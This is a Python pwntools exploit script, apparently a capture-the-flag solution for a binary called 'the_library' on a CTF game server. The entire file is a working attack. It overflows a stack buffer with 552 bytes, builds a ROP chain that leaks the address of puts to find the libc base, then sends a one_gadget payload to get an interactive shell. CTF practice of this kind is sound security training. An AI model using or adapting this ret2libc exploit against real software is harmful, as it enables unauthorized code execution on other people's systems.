#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './the_library'
HOST = 'challenge.ctf.games'
PORT = 31125
elf = ELF(exe)
if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF("./libc-2.31.so")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
'''.format(**locals())

p = start()
p.recvuntil(b"?")

log.info(f"overflow index: 552")
pad_len = 552

payload = b"A"*pad_len
payload += p64(0x0000000000401493)
payload += p64(elf.got["puts"])
payload += p64(elf.symbols["puts"])
payload += p64(elf.symbols["main"])

log.info("sending leak payload")
p.sendline(payload)
p.recvuntil(b"\n")
p.recvline()

puts_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
if not args.REMOTE:
    libc.address = puts_leak - 0x080d90
else:
    libc.address = puts_leak - 0x0875a0
log.info(f"libc base @ {hex(libc.address)}")
log.info(f"one_gadget @ {hex(libc.address + 0x0e6c81)}")

payload = b"A" * pad_len
payload += p64(libc.address + 0x0e6c81)
payload += b"\x00"*32
log.info("sending one gadget payload")
p.sendline(payload)
p.interactive()

